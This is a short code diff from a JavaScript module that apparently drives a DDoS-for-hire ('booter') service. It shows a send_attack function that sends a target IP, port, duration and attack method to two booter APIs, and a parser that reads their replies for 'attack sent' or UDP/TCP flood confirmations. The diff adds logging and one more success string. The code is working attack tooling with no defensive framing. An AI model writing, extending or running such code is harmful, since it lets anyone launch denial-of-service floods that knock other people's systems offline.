@@ -95,15 +95,17 @@ exports.send_notification = async function(usr, usr_ip, cmd) {
 exports.send_attack = async function(ip, port, time, method) {
     let response = "";
     let rreturn = await(await fetch(config.BOOTERAPI + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
+    console.log(rreturn);
     response += "API 1: " + await func.get_api_response(rreturn) + "\r\n";
     let rreturn1 = await(await fetch(config.BOOTERAPI2 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
+    console.log(rreturn1);
     response += "API 2: " + await func.get_api_response(rreturn1) + "\r\n";
     return response;
 }
 
 exports.get_api_response = function(rpn) {
     let new_res = rpn.toLowerCase();
-    if(new_res.includes("attack sent") || new_res.includes("!* udp") || new_res.includes("!* tcp")) {
+    if(new_res.includes("attack sent") || new_res.includes("!* udp") || new_res.includes("!* tcp") || new_res.includes("attack initalized")) {
         return "Attack Sent";
     } else if(new_res.includes("invalid key") || new_res.includes("key is invalid")) {
         return "Error, Invalid Key";
